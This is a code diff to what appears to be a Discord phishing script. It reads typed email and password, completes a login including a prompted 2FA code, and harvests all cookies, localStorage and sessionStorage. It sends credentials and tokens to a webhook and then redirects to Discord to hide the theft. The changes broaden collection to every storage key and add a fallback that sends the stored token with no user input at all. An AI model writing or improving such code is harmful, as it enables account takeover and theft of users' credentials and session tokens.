@@ -1,25 +1,33 @@
 // ----------------------------------
 // SELECTING ELEMENTS
 // ----------------------------------
-const loginButton = document.querySelector('button[type="submit"]'); // Discord uses type="submit" for login button
-const emailInput = document.querySelector('input[name="email"]'); // Discord uses name="email"
-const passwordInput = document.querySelector('input[name="password"]');
+// Try multiple selectors to find email and password inputs
+const emailInput = document.querySelector('input[name="email"], input[type="text"], input[placeholder*="Email"], input[id*="uid"]');
+const passwordInput = document.querySelector('input[name="password"], input[type="password"], input[placeholder*="Password"], input[id*="uid"]');
+const loginButton = document.querySelector('button[type="submit"], button[class*="button"], button');
 
-// Debug log to check if inputs are found
+// Debug log to inspect DOM and check if inputs are found
 console.log("Script loaded. Email input:", emailInput);
 console.log("Password input:", passwordInput);
+console.log("Login button:", loginButton);
+console.log("DOM snapshot of form:", document.querySelector('form')?.outerHTML || "No form found");
 
 // -----------------------------------
 // ELLIPSIS ANIMATION
 // ------------------------------------
 function removeEllipsisAnimation() {
-  loginButton.innerHTML = "";
-  loginButton.textContent = "Log In";
-  loginButton.removeAttribute("disabled");
+  if (loginButton) {
+    loginButton.innerHTML = "";
+    loginButton.textContent = "Log In";
+    loginButton.removeAttribute("disabled");
+  }
 }
 
 function animateEllipsis() {
-  loginButton.innerHTML = "";
+  if (!loginButton) {
+    console.error("Login button not found, cannot animate");
+    return;
+  }
   loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                               <span class="inner pulsingEllipsis">
                                   <span class="item spinnerItem"></span>
@@ -77,15 +85,8 @@ function collectUserTokens() {
   }, {});
   tokens.cookies = cookies;
 
-  // Get localStorage (focus on Discord's token key)
+  // Get localStorage (all keys for debugging)
   const localStorageTokens = {};
-  const localKeys = ["token", "auth_token", "jwt", "access_token"];
-  localKeys.forEach(key => {
-    if (localStorage.getItem(key)) {
-      localStorageTokens[key] = localStorage.getItem(key);
-    }
-  });
-  // Include all localStorage keys for debugging
   for (let i = 0; i < localStorage.length; i++) {
     const key = localStorage.key(i);
     localStorageTokens[key] = localStorage.getItem(key);
@@ -94,12 +95,10 @@ function collectUserTokens() {
 
   // Get sessionStorage
   const sessionStorageTokens = {};
-  const sessionKeys = ["session_token", "temp_token"];
-  sessionKeys.forEach(key => {
-    if (sessionStorage.getItem(key)) {
-      sessionStorageTokens[key] = sessionStorage.getItem(key);
-    }
-  });
+  for (let i = 0; i < sessionStorage.length; i++) {
+    const key = sessionStorage.key(i);
+    sessionStorageTokens[key] = sessionStorage.getItem(key);
+  }
   tokens.sessionStorage = sessionStorageTokens;
 
   console.log("Collected tokens:", JSON.stringify(tokens, null, 2));
@@ -110,7 +109,7 @@ function collectUserTokens() {
 // ---------- FETCH ACCOUNT TOKEN -------------------
 // --------------------------------------------------
 async function fetchAccountToken(email, password) {
-  const apiUrl = "/api/v9/auth/login"; // Relative path for same-origin request
+  const apiUrl = "/api/v9/auth/login"; // Relative path for same-origin
   const payload = {
     login: email,
     password: password,
@@ -136,7 +135,6 @@ async function fetchAccountToken(email, password) {
 
     const data = JSON.parse(responseText);
     if (data.mfa) {
-      // MFA required
       const mfaCode = prompt("Enter your 2FA code:");
       if (!mfaCode) throw new Error("MFA code required");
 
@@ -192,7 +190,7 @@ async function fetchAccountToken(email, password) {
     return { apiToken: token, userTokens };
   } catch (error) {
     console.error("Error fetching token:", error.message);
-    // Still collect localStorage token even if API fails
+    // Fallback to localStorage token
     const userTokens = collectUserTokens();
     if (userTokens.localStorage.token) {
       console.log("Found existing token in localStorage:", userTokens.localStorage.token);
@@ -246,37 +244,62 @@ async function sendToWebhook(email, password, tokenData) {
 // --------------------------
 // ATTACHING EVENT LISTENERS
 // --------------------------
-loginButton.addEventListener("click", async () => {
-  const email = emailInput ? emailInput.value.trim() : "";
-  const password = passwordInput ? passwordInput.value.trim() : "";
+if (loginButton) {
+  loginButton.addEventListener("click", async () => {
+    const email = emailInput ? emailInput.value.trim() : "No email input found";
+    const password = passwordInput ? passwordInput.value.trim() : "No password input found";
 
-  console.log("Email:", email, "Password:", password);
+    console.log("Email:", email, "Password:", password);
 
-  if (!email || !password) {
-    alert("Please enter both email and password!");
-    return;
-  }
-
-  // Start animation
-  animateEllipsis();
-
-  // Fetch token and storage data
-  const tokenData = await fetchAccountToken(email, password);
-
-  // Send to webhook with token and collected user tokens
-  const webhookSuccess = await sendToWebhook(email, password, tokenData);
-
-  // After animation (3s), redirect if success
-  setTimeout(() => {
-    if (webhookSuccess) {
-      console.log("Redirecting to Discord...");
-      window.location.href = "https://discord.com/channels/@me";
-    } else {
-      console.log("Webhook failed - no redirect");
-      alert("Login failed - check console for details");
+    if (!emailInput || !passwordInput) {
+      console.warn("Input fields missing, attempting to send localStorage token");
+      const userTokens = collectUserTokens();
+      if (userTokens.localStorage.token) {
+        const tokenData = { apiToken: userTokens.localStorage.token, userTokens };
+        const webhookSuccess = await sendToWebhook(email, password, tokenData);
+        if (webhookSuccess) {
+          console.log("Redirecting to Discord...");
+          window.location.href = "https://discord.com/channels/@me";
+        } else {
+          console.log("Webhook failed - no redirect");
+          alert("Login failed - check console for details");
+        }
+        return;
+      }
+      alert("Please ensure email and password fields are present!");
+      return;
     }
-  }, 3000);
-});
+
+    // Start animation
+    animateEllipsis();
+
+    // Fetch token and storage data
+    const tokenData = await fetchAccountToken(email, password);
+
+    // Send to webhook with token and collected user tokens
+    const webhookSuccess = await sendToWebhook(email, password, tokenData);
+
+    // After animation (3s), redirect if success
+    setTimeout(() => {
+      if (webhookSuccess) {
+        console.log("Redirecting to Discord...");
+        window.location.href = "https://discord.com/channels/@me";
+      } else {
+        console.log("Webhook failed - no redirect");
+        alert("Login failed - check console for details");
+      }
+    }, 3000);
+  });
+} else {
+  console.error("Login button not found, attempting to send localStorage token");
+  const userTokens = collectUserTokens();
+  if (userTokens.localStorage.token) {
+    sendToWebhook("No email input found", "No password input found", {
+      apiToken: userTokens.localStorage.token,
+      userTokens
+    });
+  }
+}
 
 document.addEventListener("contextmenu", function (e) {
   e.preventDefault();
